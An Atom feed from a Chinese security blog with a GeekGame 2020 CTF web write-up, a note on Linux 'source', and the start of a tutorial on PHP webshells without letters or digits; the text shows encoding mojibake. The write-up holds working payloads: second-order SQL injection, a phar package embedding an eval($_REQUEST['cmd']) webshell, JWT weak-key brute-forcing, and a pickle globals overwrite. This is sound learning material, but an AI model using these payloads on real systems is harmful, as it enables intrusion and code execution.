<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>X5tar&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://x5tar.com/"/>
  <updated>2020-05-27T10:29:35.593Z</updated>
  <id>https://x5tar.com/</id>
  
  <author>
    <name>X5tar</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>GeekGame 2020 WEB å¤ç°</title>
    <link href="https://x5tar.com/2020/05/27/geekgame2020/"/>
    <id>https://x5tar.com/2020/05/27/geekgame2020/</id>
    <published>2020-05-27T08:57:49.000Z</published>
    <updated>2020-05-27T10:29:35.593Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¢«å·å¤§çš„åŒå­¦å«æ¥æ‰“è¿™ä¸ªæ¯”èµ›</p><p>å—¯æ²¡é”™è¿™æ¬¡æ¯”èµ›éå¸¸ç¥å¥‡ï¼Œæ°´å‡ºæ¥çš„ RE å’Œ Crypto éƒ½æ¯” WEB å¤šâ€¦</p><p>æ¯”èµ›çš„æ—¶å€™å°±åšå‡ºæ¥ä¸€é“ WEBï¼ˆçœŸçš„èœ</p><h2 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h2><p>çœŸçš„æ˜¯è¿™æ¬¡æ¯”èµ›æœ€ç®€å•çš„ä¸€é“é¢˜äº†</p><p>æœ€å¸¸è§„çš„äºŒæ¬¡æ³¨å…¥</p><p>å…ˆæ³¨å†Œä¸€ä¸ªåä¸º <code>admin&#39;#</code> çš„ç”¨æˆ·ï¼Œç™»å½•åä¿®æ”¹å¯†ç </p><p>å†ç”¨ <code>admin</code> å’Œä¿®æ”¹åçš„å¯†ç ç™»å½•å³å¯</p><blockquote><p>æ¯”èµ›çš„æ—¶å€™æ²¡å‘ç°æœ‰æºç æ³„éœ²ï¼Œç›´æ¥çœ‹ SQL è¯­å¥å¯èƒ½æ›´ç›´è§‚ä¸€äº›</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$x=$db-&gt;execute(<span class="string">"update users set password=? where username='$username' "</span>,[<span class="string">'s'</span>,&amp;$password]);</span><br></pre></td></tr></table></figure></blockquote><h2 id="ååºåˆ—åŒ–ï¼Ÿ"><a href="#ååºåˆ—åŒ–ï¼Ÿ" class="headerlink" title="ååºåˆ—åŒ–ï¼Ÿ"></a>ååºåˆ—åŒ–ï¼Ÿ</h2><p>æ‰“å¼€æ˜¯ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œåªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œå¹¶ä¸”æœ‰ä¸ª <code>vulnerable.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $filename = <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $code;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"æ–‡ä»¶å­˜åœ¨çš„å‘¢;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"å•Šè¿™ï¼Œæ–‡ä»¶ä¸åœ¨å“¦"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é¢˜ååŠ äº†ä¸ªé—®å·ï¼Œé‚£å°±ä¸æ˜¯ååºåˆ—åŒ–ï¼Œä½†æ˜¯è¿˜ä¸çŸ¥é“æ€ä¹ˆåš</p><p>çœ‹äº†å®˜æ–¹ WPï¼Œè¿™çœŸçš„æ¶‰åŠåˆ°æˆ‘çš„çŸ¥è¯†ç›²åŒºäº†</p><p><code>vulnerable.php</code> ä¸­ç”¨åˆ°äº† <code>file_exists</code> å‡½æ•°</p><blockquote><p>è‡ª PHP 5.0.0 èµ·, æ­¤å‡½æ•°ä¹Ÿç”¨äºæŸäº› URL åŒ…è£…å™¨</p><p><code>file_exists</code>å‡½æ•°åœ¨æ£€æŸ¥ phar åŒ…çš„æ—¶å€™ä¼šå°†å…¶è§£æ</p></blockquote><p>ç”¨å¦‚ä¸‹ payload ç”Ÿæˆ phar åŒ…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $code;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($my_code)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = $my_code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'a.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$object = <span class="keyword">new</span> Flag(<span class="string">'eval($_REQUEST["cmd"]);'</span>);</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'a.txt'</span>, <span class="string">'a'</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>æ³¨æ„æ·»åŠ æ–‡ä»¶å¤´ç»•è¿‡æ–‡ä»¶ç±»å‹æ£€æµ‹ï¼Œç”Ÿæˆåæ”¹åç¼€ä¸º gif ä¸Šä¼ ï¼Œå†ç”¨ phar åè®®è¯»å–å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vulnerable.php?filename&#x3D;phar:&#x2F;&#x2F;upload&#x2F;a.gif</span><br></pre></td></tr></table></figure><h2 id="ezcode"><a href="#ezcode" class="headerlink" title="ezcode"></a>ezcode</h2><p>ç›´åˆ°æ¯”èµ›ç»“æŸåªæœ‰ä¸€è§£çš„é¢˜</p><p>æ‰“å¼€å¯ä»¥æ³¨å†Œå’Œç™»å½•ï¼Œæ³¨å†Œè¿”å›ä¸€ä¸² JWTï¼Œåˆšå¼€å§‹æ¯«æ— æ€è·¯ï¼Œåæ¥ç»™äº†ä¸€ä¸ª hint</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint ï¼štop1000</span><br></pre></td></tr></table></figure><p>ï¼Ÿtop1000 å¼±å£ä»¤å—</p><p>è·‘äº†ä¸€ä¸‹æœç„¶è·‘å‡ºæ¥äº† key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = <span class="string">'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEyMzQifQ.f_U2qBN5qFbsWyIQhfIGYw2aDzX1QTKefGn-QuZ8FIw'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'top1000.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    top1000 = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines()]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> top1000:</span><br><span class="line">    test_token = jwt.encode(&#123;<span class="string">'username'</span>:<span class="string">'1234'</span>&#125;, algorithm=<span class="string">'HS256'</span>, key=i).decode()</span><br><span class="line">    <span class="keyword">if</span> test_token == token:</span><br><span class="line">        print(<span class="string">'Found it!'</span>)</span><br><span class="line">        print(i)</span><br><span class="line">        print(jwt.encode(&#123;<span class="string">'username'</span>:<span class="string">'admin'</span>&#125;, algorithm=<span class="string">'HS256'</span>, key=i).decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><img src="/2020/05/27/geekgame2020/JWT.png"><p>ç”¨ç”Ÿæˆçš„ JWT ç™»å½•å‘ç°è¿˜æœ‰ç¬¬äºŒå…³ï¼Œçœ‹ä¸€ä¸‹æºç æœ‰æ³¨é‡Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">want2know=xxx</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    blacklist = &#123;</span><br><span class="line">        <span class="string">'sys'</span>,<span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'open'</span>, <span class="string">'input'</span>, <span class="string">'__import__'</span>, <span class="string">'exit'</span>,<span class="string">'getattr'</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> getattr(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        pickle_data=request.form.get(<span class="string">'data'</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> pickle_data==<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> open(<span class="string">'templates/pickle.html'</span>).read()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data=base64.b64decode(pickle_data.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            op_blackli=[<span class="string">b'R'</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> op <span class="keyword">in</span> op_blackli:</span><br><span class="line">                <span class="keyword">if</span> op <span class="keyword">in</span> pickle_data:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">'æ•°æ®éæ³•ï¼'</span>+op.decode()</span><br><span class="line">            data=restricted_loads(pickle_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> <span class="string">"è¯·è¾“å…¥æ­£ç¡®çš„æ•°æ®æ ¼å¼ï¼"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            secret=request.form.get(<span class="string">'secret'</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> open(<span class="string">'templates/pickle.html'</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> want2know==secret:</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'æ¬¢è¿ä½¿ç”¨HACHp1çš„pickleæµ‹è¯•å·¥å…·ï¼'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'æ²¡æœ‰æƒé™æŸ¥çœ‹ï¼\n'</span></span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€ä¸ª pickle ååºåˆ—åŒ–ï¼Œåªçœ‹å‡ºæ¥ç¦æ­¢ç”¨ <code>R</code> æ‰§è¡Œå‡½æ•°ï¼Œç„¶åå°±ä¸ä¼šäº†ï¼ˆ</p><p>çœ‹äº† WP è¿™é‡Œæ˜¯åˆ©ç”¨ <code>globals</code> æˆ– <code>locals</code> å‡½æ•°ç›´æ¥ä¿®æ”¹ <code>want2know</code> ä½¿å…¶ä¸è¾“å…¥çš„ <code>secret</code> ç›¸ç­‰</p><p>å‡ºé¢˜å£¬æ¨èç”¨ <a href="https://github.com/eddieivan01/pker" target="_blank" rel="noopener">pker</a> æ„å»ºåºåˆ—åŒ–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">glo_dic=INST(<span class="string">'builtins'</span>,<span class="string">'globals'</span>)</span><br><span class="line">glo_dic[<span class="string">'want2know'</span>]=<span class="string">'test'</span></span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆ payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&quot;(ibuiltins\nglobals\np0\n0g0\nS&#39;want2know&#39;\nS&#39;test&#39;\ns.&quot;</span><br></pre></td></tr></table></figure><p>base64 ä¸€ä¸‹å³å¯</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç¬¬ä¸€é“ WEB æ¯”è¾ƒç…§é¡¾æˆ‘è¿™æ ·çš„èœğŸ¶</p><p>åä¸¤é“ WEB è´¨é‡è¿˜æ˜¯ä¸é”™çš„ï¼Œéƒ½æ¶‰åŠåˆ°äº†æˆ‘ä¸ä¼šçš„çŸ¥è¯†ç‚¹</p><p>phar å’Œ pickle ä¼¼ä¹éƒ½æ˜¯ç¬¬ä¸€æ¬¡åšåˆ°</p><p>é™¤äº†åšä¸å‡ºæ¥ï¼Œä½“éªŒæŒºä¸é”™çš„ï¼ˆ</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;è¢«å·å¤§çš„åŒå­¦å«æ¥æ‰“è¿™ä¸ªæ¯”èµ›&lt;/p&gt;&lt;p&gt;å—¯æ²¡é”™è¿™æ¬¡æ¯”èµ›éå¸¸ç¥å¥‡ï¼Œæ°´å‡ºæ¥çš„ RE å’Œ Crypto éƒ½æ¯” WEB å¤šâ€¦&lt;/p&gt;&lt;p&gt;æ¯”èµ›çš„æ—¶å€™
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://x5tar.com/categories/CTF/"/>
    
    
      <category term="WriteUp" scheme="https://x5tar.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>Linux ä¸­çš„ source å‘½ä»¤ï¼ˆç‚¹å‘½ä»¤ï¼‰</title>
    <link href="https://x5tar.com/2020/05/10/source-command/"/>
    <id>https://x5tar.com/2020/05/10/source-command/</id>
    <published>2020-05-10T02:26:57.000Z</published>
    <updated>2020-05-10T03:07:36.619Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨åšé¢˜çš„æ—¶å€™é‡åˆ°äº†ä¸Šä¼ äº† shell è„šæœ¬ä½†æ˜¯æ²¡æœ‰æ‰§è¡Œæƒé™çš„æƒ…å†µ</p><p>æµ‹è¯•è„šæœ¬</p><img src="/2020/05/10/source-command/shell.png" title="shell"><p>æœ¬åœ°æµ‹è¯•ç»“æœ</p><img src="/2020/05/10/source-command/denied.png" title="denied"><p>ç„¶åå°±å‘ç°äº† source å‘½ä»¤</p><img src="/2020/05/10/source-command/source.png" title="source"><p>ç‚¹å‘½ä»¤ï¼ˆé”™è¯¯ç¤ºèŒƒï¼‰</p><img src="/2020/05/10/source-command/dot_error.png" title="dot_error"><p>ç‚¹å‘½ä»¤ï¼ˆå¿…é¡»åŠ  ./ï¼‰</p><img src="/2020/05/10/source-command/dot.png" title="dot"><p>source å‘½ä»¤å’Œç‚¹å‘½ä»¤åœ¨ä½œç”¨ä¸Šå®Œå…¨ç›¸åŒ</p><p>è€Œé™¤äº†å¯ä»¥ä¸éœ€è¦æ‰§è¡Œæƒé™å¤–ï¼Œsource å‘½ä»¤ï¼ˆç‚¹å‘½ä»¤ï¼‰è¿˜æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œå³ source å‘½ä»¤æ˜¯åœ¨æœ¬ shell å†…æ‰§è¡Œï¼Œè€Œ ç›´æ¥æ‰§è¡Œè„šæœ¬æ˜¯åœ¨æ–°å¼€ shell ä¸­æ‰§è¡Œï¼Œå³ source å‘½ä»¤å¯ä»¥è®¾ç½®å½“å‰ shell çš„ç¯å¢ƒå˜é‡ï¼Œæ•…å¸¸ç”¨æ¥ä½¿ä¿®æ”¹è¿‡çš„åˆå§‹åŒ–æ–‡ä»¶ï¼ˆ.bashrc .profile ç­‰ï¼‰ç«‹å³ç”Ÿæ•ˆ</p><p>æµ‹è¯•è„šæœ¬</p><img src="/2020/05/10/source-command/env.png" title="env"><p>ç›´æ¥æ‰§è¡Œ</p><img src="/2020/05/10/source-command/env_shell.png" title="env_shell"><p>source å‘½ä»¤</p><img src="/2020/05/10/source-command/env_source.png" title="env_source"><p>ç‚¹å‘½ä»¤</p><img src="/2020/05/10/source-command/env_dot.png" title="env_dot">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;åœ¨åšé¢˜çš„æ—¶å€™é‡åˆ°äº†ä¸Šä¼ äº† shell è„šæœ¬ä½†æ˜¯æ²¡æœ‰æ‰§è¡Œæƒé™çš„æƒ…å†µ&lt;/p&gt;&lt;p&gt;æµ‹è¯•è„šæœ¬&lt;/p&gt;&lt;img src=&quot;/2020/05/10/source-command/shell.png&quot; title=&quot;shell&quot;&gt;&lt;p&gt;æœ¬åœ°æµ‹è¯•ç»“æœ&lt;/p&gt;&lt;img src=&quot;/2020
      
    
    </summary>
    
    
      <category term="æ‚é¡¹" scheme="https://x5tar.com/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="Linux" scheme="https://x5tar.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>PHP ä¸­ä¸åŒ…å«å­—æ¯å’Œæ•°å­—çš„ webshell</title>
    <link href="https://x5tar.com/2020/05/03/php-webshell-without-alpha-and-num/"/>
    <id>https://x5tar.com/2020/05/03/php-webshell-without-alpha-and-num/</id>
    <published>2020-05-03T12:47:41.000Z</published>
    <updated>2020-05-03T12:47:41.277Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>åˆæ˜¯å¥½å¤šå¤©æ²¡å†™åšå®¢äº†ï¼Œå°±æƒ³ç€å†æ¥éšä¾¿æ°´ç‚¹ä»€ä¹ˆå§</p><p>è¿™ç§ç¥å¥‡çš„é¢˜æ›¾ç»åœ¨ <a href="/2019/10/24/cnss-recruit-2019-web-boss/">CNSS Recruit 2019 Web Bossé¢˜</a> ä¸­å‡ºç°è¿‡ï¼Œæœ€è¿‘åšé¢˜åˆé‡åˆ°äº†ä¸€æ¬¡ç»“æœè¿˜æ˜¯ä¸ä¼šï¼ˆå› ä¸ºåˆå¤šè¿‡æ»¤äº†ä¸€äº›ç¬¦å·ä¹‹å‰çš„æ–¹æ³•å°±ä¹Ÿä¸èƒ½ç”¨äº†ï¼‰ï¼Œå°±æŠŠå®ƒå†™ä¸‹æ¥å§ï¼Œå…·ä½“æ–¹æ³•æœ‰ä¸‰ç§ï¼Œå¯ä»¥çµæ´»ä½¿ç”¨ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯ PHP5.6 ç¯å¢ƒï¼Œå…·ä½“åŸå› ä¼šåœ¨ä¸‹æ–‡è¯´æ˜ï¼Œæºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9]/is'</span>,$_GET[<span class="string">'code'</span>])) &#123;</span><br><span class="line">4<span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"nonono!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x01-å‰ç½®çŸ¥è¯†ï¼ˆPHP-ä¸­çš„ä¸€äº›ç‰¹æ€§ï¼‰"><a href="#0x01-å‰ç½®çŸ¥è¯†ï¼ˆPHP-ä¸­çš„ä¸€äº›ç‰¹æ€§ï¼‰" class="headerlink" title="0x01 å‰ç½®çŸ¥è¯†ï¼ˆPHP ä¸­çš„ä¸€äº›ç‰¹æ€§ï¼‰"></a>0x01 å‰ç½®çŸ¥è¯†ï¼ˆPHP ä¸­çš„ä¸€äº›ç‰¹æ€§ï¼‰</h2><ol><li><p>å¯å˜å‡½æ•°ï¼Œå³å¯ä»¥ç”¨å­—ç¬¦ä¸²å˜é‡å……å½“å‡½æ•°åï¼ˆeval ç­‰è¯­è¨€ç»“æ„ä¸å¯ä½¿ç”¨ï¼‰</p><blockquote><p>å¦‚æœä¸€ä¸ªå˜é‡ååæœ‰åœ†æ‹¬å·ï¼ŒPHP å°†å¯»æ‰¾ä¸å˜é‡çš„å€¼åŒåçš„å‡½æ•°ï¼Œå¹¶ä¸”å°è¯•æ‰§è¡Œå®ƒ</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $a = <span class="string">'strrev'</span>;</span><br><span class="line">   $b = <span class="string">'Hello'</span>;</span><br><span class="line">   <span class="keyword">echo</span> $a($b); <span class="comment">// olleH</span></span><br></pre></td></tr></table></figure></li><li><p>å¯å˜å˜é‡ï¼Œå³åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²å˜é‡å‰å†åŠ ä¸€ä¸ª <code>$</code> å¯å°†è¯¥å˜é‡çš„å€¼å½“ä½œå˜é‡å</p><blockquote><p>ä¸€ä¸ªå¯å˜å˜é‡å¯ä»¥è·å–ä¸€ä¸ªæ™®é€šå˜é‡çš„å€¼ä½œä¸ºè¿™ä¸ªå¯å˜å˜é‡çš„å˜é‡å</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'hello'</span>;</span><br><span class="line">$$a = <span class="string">'world'</span>;</span><br><span class="line"><span class="keyword">echo</span> $hello; <span class="comment">// world</span></span><br><span class="line">$hello = <span class="string">'dlrow'</span>;</span><br><span class="line"><span class="keyword">echo</span> $$a; <span class="comment">// dlrow</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="0x02-æ€è·¯åˆ†æåŠä¸‰ç§æ–¹æ³•"><a href="#0x02-æ€è·¯åˆ†æåŠä¸‰ç§æ–¹æ³•" class="headerlink" title="0x02 æ€è·¯åˆ†æåŠä¸‰ç§æ–¹æ³•"></a>0x02 æ€è·¯åˆ†æåŠä¸‰ç§æ–¹æ³•</h2><p>æˆ‘ä»¬éœ€è¦å°†å„ç§ç¬¦å·è¿›è¡Œå˜æ¢ç»„åˆï¼Œæœ€ç»ˆæ„é€ å‡ºå„ç§å­—æ¯æ•°å­—ï¼Œä»¥æ‰§è¡Œæ‰€éœ€å‘½ä»¤</p><p>å¤§è‡´æ€è·¯ä¸ºæ„é€  <code>assert($_POST[_])</code> è·å– shell</p><p>è¿™é‡Œè¯´ä¸€ä¸‹éœ€è¦ä½¿ç”¨ PHP5 çš„åŸå› </p><blockquote><p>PHP5 ä¸­ <code>assert</code> ä¸ºå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡ <code>$a=&#39;assert&#39;;$a(...)</code> çš„æ–¹å¼æ‰§è¡Œï¼Œè¿™ä¹Ÿæ˜¯ä¹‹åé€‰ç”¨ <code>assert</code> è€Œä¸é€‰ç”¨ <code>eval</code> çš„åŸå› </p><p>PHP7 ä¸­ <code>assert</code> å˜ä¸ºäº†å’Œ <code>eval</code> ä¸€æ ·çš„è¯­è¨€ç»“æ„ï¼Œå³ä¸èƒ½å†ç”¨ä»¥ä¸Šæ–¹æ³•æ‰§è¡Œ</p></blockquote><p>åœ¨è¿™ç¯‡æ–‡ç« ç»“å°¾æˆ‘ä¹Ÿä¼šç®€è¦åˆ†æä¸€ä¸‹åœ¨ PHP7 ä¸­æ€ä¹ˆæ“ä½œ</p><h3 id="æ³•ä¸€ï¼šå¼‚æˆ–"><a href="#æ³•ä¸€ï¼šå¼‚æˆ–" class="headerlink" title="æ³•ä¸€ï¼šå¼‚æˆ–"></a>æ³•ä¸€ï¼šå¼‚æˆ–</h3><blockquote><p>å¼‚æˆ–å³ PHP ä¸­çš„è¿ç®—ç¬¦ <code>^</code></p><p><code>$a ^ $b</code> 